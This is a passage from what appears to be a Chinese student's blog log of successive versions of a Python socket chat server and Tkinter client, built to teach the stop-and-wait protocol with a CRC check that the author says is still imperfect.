punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    cnt <span class="token operator">=</span> cnt <span class="token operator">+</span> <span class="token number">1</span>    <span class="token comment">#每当有客户连接后，就启动一个线程为其服务</span>    <span class="token comment">#加入线程中跑，加入函数为send_client，参数为client,nickname</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>send_client<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span>nickname<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0-65-1"><a href="#0-65-1" class="headerlink" title="0.65"></a><strong>0.65</strong></h3><p><strong>作用：早上灵光一现，以为CRC是取模了……</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#服务端</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threading<span class="token keyword">import</span> timehost <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取当前主机的IP地址</span>port <span class="token operator">=</span> <span class="token number">9999</span> <span class="token comment">#设置防火墙开放端口</span>SocketList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储客户端套接字的列表</span>TextList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储聊天记录</span>Nickname <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储用户呢称</span>cnt <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment">#当前客户端人数</span><span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建server对象</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#绑定</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#监听</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务器准备就绪！'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">DEC</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> data    d <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> s<span class="token punctuation">:</span>        d <span class="token operator">=</span> d<span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        s <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> d<span class="token keyword">def</span> <span class="token function">CRC</span><span class="token punctuation">(</span>crc<span class="token punctuation">,</span>poly<span class="token operator">=</span><span class="token string">'11001'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> DEC<span class="token punctuation">(</span>poly<span class="token punctuation">)</span>    c <span class="token operator">=</span> DEC<span class="token punctuation">(</span>crc<span class="token operator">+</span><span class="token string">'0000'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>c<span class="token punctuation">)</span>    res <span class="token operator">=</span> c<span class="token operator">%</span>p    <span class="token keyword">return</span> res<span class="token comment">#接收一个客户端连接，及其发送来数据</span><span class="token keyword">def</span> <span class="token function">read_client</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment">#接受客户端发送来的数据</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token comment">#客户端异常，连接失败，则删除该socket</span>        <span class="token comment"># print(str(addr)+'已下线！')</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">'已下线！'</span><span class="token punctuation">)</span>        SocketList<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        Nickname<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>nickname<span class="token punctuation">)</span>        <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>            sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'系统消息：'</span> <span class="token operator">+</span> nickname <span class="token operator">+</span> <span class="token string">'已下线！'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#多线程：将收到的消息发送给所有客户端</span><span class="token keyword">def</span> <span class="token function">send_client</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># s.send((','.join(Nickname)).encode('utf-8')) #将用户列表发送给各客户端</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> read_client<span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span> <span class="token comment">#客户端消息</span>            <span class="token keyword">if</span> content <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span> <span class="token comment">#如果没有结束循环</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment">#如果有将消息保存到历史记录</span>                <span class="token comment"># TextList.append(str(addr)+': '+content)</span>                TextList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> content<span class="token punctuation">)</span>            <span class="token comment">#将一个客户端发送过来的数据广播给其他客户端</span>            <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>                <span class="token comment"># sock.send((str(addr)+': '+content).encode('utf-8'))</span>                sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> content<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            data <span class="token operator">=</span> CRC<span class="token punctuation">(</span>content<span class="token punctuation">)</span>            <span class="token keyword">if</span> data<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                word <span class="token operator">=</span> <span class="token string">'发送帧没问题。'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                word <span class="token operator">=</span> <span class="token string">'发送帧有问题。'</span>            <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>                <span class="token comment"># sock.send((str(addr)+': '+content).encode('utf-8'))</span>                sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Teacher: '</span> <span class="token operator">+</span> word<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token comment"># print(repr())</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'广播未成功！'</span><span class="token punctuation">)</span>QianYan <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'你好呀！今天我们一起来学习SW。'</span><span class="token punctuation">,</span>           <span class="token string">'可靠传输机制是为了使数据可以正确稳定的传输和接收而制定的规则。'</span><span class="token punctuation">,</span>           <span class="token string">'流量控制是数据链路层的一种功能，流量控制对数据链路上的帧的发送速率进行控制，以使接收方有足够的缓冲空间来接受每个帧。'</span><span class="token punctuation">,</span>           <span class="token string">'流量控制的基本方法是由接收方控制发送方发送数据的速率。'</span><span class="token punctuation">,</span>           <span class="token string">'常见的流量控制方式有两种：`停止-等待协议、滑动窗口协议'</span><span class="token punctuation">,</span>           <span class="token string">'那么，让我们开始体验停止-等待协议SW的魅力吧！'</span><span class="token punctuation">,</span>           <span class="token string">'\n\n请输入十六进制数据'</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    client<span class="token punctuation">,</span>addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    SocketList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>client<span class="token punctuation">)</span>    nickname <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token comment"># print(str(addr)+'已加入！')</span>    <span class="token keyword">if</span> nickname <span class="token keyword">in</span> Nickname<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> nickname<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">in</span> Nickname<span class="token punctuation">:</span>                i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                nickname <span class="token operator">=</span> nickname <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">break</span>    Nickname<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nickname<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">'已加入！'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> QianYan<span class="token punctuation">:</span>            sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Teacher: '</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    cnt <span class="token operator">=</span> cnt <span class="token operator">+</span> <span class="token number">1</span>    <span class="token comment">#每当有客户连接后，就启动一个线程为其服务</span>    <span class="token comment">#加入线程中跑，加入函数为send_client，参数为client,nickname</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>send_client<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span>nickname<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#客户端</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threading<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>messagebox <span class="token comment">#弹窗库</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> scrolledtext  <span class="token comment">#滚动文本框</span>server_host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span>server_port <span class="token operator">=</span> <span class="token number">9999</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建socket对象</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting......'</span><span class="token punctuation">)</span><span class="token comment">#登入窗口：输入呢称</span><span class="token keyword">def</span> <span class="token function">LoginWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'一起来聊天 · 登录'</span><span class="token punctuation">)</span> <span class="token comment">#窗口标题</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'300x150'</span><span class="token punctuation">)</span> <span class="token comment">#窗口大小</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'+500+300'</span><span class="token punctuation">)</span> <span class="token comment">#改变窗体位置（‘+横坐标+纵坐标’）</span>    nickname <span class="token operator">=</span> StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#昵称变量（对象）:在使用界面编程的时候，有些时候是需要跟踪变量的值的变化，以保证值的变更随时可以显示在界面上</span>    root<span class="token punctuation">.</span>resizable<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#将窗口大小设置为不可变</span>    <span class="token comment">#登录函数（检查用户名是否为空，以及长度）</span>    <span class="token keyword">def</span> <span class="token function">Login_in</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> nickname<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#????</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> name<span class="token punctuation">:</span>            tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showwarning<span class="token punctuation">(</span><span class="token string">'Warning'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'用户名为空！'</span><span class="token punctuation">)</span> <span class="token comment">#消息警告框</span>        <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showwarning<span class="token punctuation">(</span><span class="token string">'Warning'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'用户名过长！最多为十个字符！'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            root<span class="token punctuation">.</span>destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>server_host<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 连接服务端，指定主机和端口</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting is successful!'</span><span class="token punctuation">)</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 传递用户昵称</span>            ChatRoom<span class="token punctuation">(</span>name<span class="token punctuation">)</span>  <span class="token comment"># 打开聊天窗口</span>    <span class="token comment">#登录按钮、输入提示标签、输入框</span>    Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"登录"</span><span class="token punctuation">,</span> command<span class="token operator">=</span>Login_in<span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">35</span><span class="token punctuation">)</span>    Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'请输入昵称'</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span>    Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span> textvariable<span class="token operator">=</span>nickname<span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">180</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#聊天窗口</span><span class="token keyword">def</span> <span class="token function">ChatRoom</span><span class="token punctuation">(</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'650x400'</span><span class="token punctuation">)</span>  <span class="token comment"># 窗口大小</span>    root<span class="token punctuation">.</span>resizable<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 将窗口大小设置为不可变</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'+500+300'</span><span class="token punctuation">)</span>  <span class="token comment"># 改变窗体位置（‘+横坐标+纵坐标’）</span>    <span class="token comment"># content = client.recv(2048).decode('utf-8')</span>    <span class="token comment"># if content != 'No message.':</span>    <span class="token comment">#     past_text = content + '\n------以上是历史消息------\n'</span>    <span class="token comment"># 从服务器端获取当前用户列表</span>    <span class="token comment"># UserList = []</span>    <span class="token comment"># UserList = client.recv(2048).decode('utf-8').split(',')</span>    <span class="token comment"># UserList.insert(0, '------当前用户列表------')</span>    <span class="token comment"># 窗口标题</span>    <span class="token comment"># nickname = UserList[len(UserList)-1]</span>    root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'一起来聊天 · '</span> <span class="token operator">+</span> nickname<span class="token punctuation">)</span>    <span class="token comment"># name_text = StringVar()</span>    <span class="token comment"># name_text.set(UserList)  # 用户列表文本设置</span>    <span class="token comment"># listbox1 = Listbox(root, listvariable=name_text)  # 用户列表，使用Listbox组件</span>    <span class="token comment"># listbox1.place(x=5, y=0, width=500, height=400)</span>    img_png <span class="token operator">=</span> PhotoImage<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'QQ图片20220901201640.png'</span><span class="token punctuation">)</span>    label_img <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> image<span class="token operator">=</span>img_png<span class="token punctuation">)</span>    label_img<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">400</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">350</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">)</span>    <span class="token comment">#聊天界面</span>    <span class="token comment"># content = client.recv(2048).decode('utf-8')</span>    ChatBox <span class="token operator">=</span> scrolledtext<span class="token punctuation">.</span>ScrolledText<span class="token punctuation">(</span>root<span class="token punctuation">)</span>  <span class="token comment"># 聊天信息窗口，使用ScrolledText组件制作</span>    ChatBox<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">470</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">)</span>    <span class="token comment"># ChatBox.pack()</span>    <span class="token comment"># ChatBox.insert('end',content)</span>    <span class="token keyword">def</span> <span class="token function">read_server</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            ChatBox<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token operator">+</span>content<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>            ChatBox<span class="token punctuation">.</span>see<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">)</span>  <span class="token comment"># ScrolledText组件方法，自动定位到结尾，否则只有消息在涨，窗口拖动条不动</span>            ChatBox<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 更新聊天信息窗口，显示新的信息</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read_server<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#聊天输入框</span>    word <span class="token operator">=</span> StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>    word<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    SentBox <span class="token operator">=</span> Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">140</span><span class="token punctuation">,</span>textvariable<span class="token operator">=</span>word<span class="token punctuation">)</span> <span class="token comment">#建一个输入框</span>    SentBox<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">305</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">475</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">)</span> <span class="token comment">#设置大小和位置</span>    <span class="token comment">#发送按钮</span>    <span class="token keyword">def</span> <span class="token function">sendtext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content <span class="token operator">=</span> word<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获得文本内容</span>        <span class="token keyword">if</span> content<span class="token operator">==</span><span class="token string">'end'</span><span class="token punctuation">:</span>            client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        word<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment">#用了一个标记记录点击的状态，不管内容是什么点了就变</span>    sendButton <span class="token operator">=</span> Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'发 送'</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bg<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span> command<span class="token operator">=</span>sendtext<span class="token punctuation">)</span>    sendButton<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">490</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">308</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">150</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">85</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>LoginWindow<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0-7"><a href="#0-7" class="headerlink" title="0.7"></a>0.7</h3><p><strong>作用：拿的网上的CRC但感觉还是错的……</strong></p><blockquote><p><a href="https://cn.bing.com/search?q=crc%E5%8E%9F%E7%90%86Python&qs=n&form=QBRE&sp=-1&pq=crc%E5%8E%9F%E7%90%86python&sc=0-11&sk=&cvid=66D0F3FB7AC54F3683ABFEB1122DA0BF&ghsh=0&ghacc=0&ghpl=">crc原理Python - Search (bing.com)</a></p><p><a href="https://blog.csdn.net/smallfox233/article/details/111242813">https://blog.csdn.net/smallfox233/article/details/111242813</a></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#服务端</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threading<span class="token keyword">import</span> timehost <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取当前主机的IP地址</span>port <span class="token operator">=</span> <span class="token number">9999</span> <span class="token comment">#设置防火墙开放端口</span>SocketList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储客户端套接字的列表</span>TextList <span class="token operator">=</span> <span class="token punctuation">[</span><span 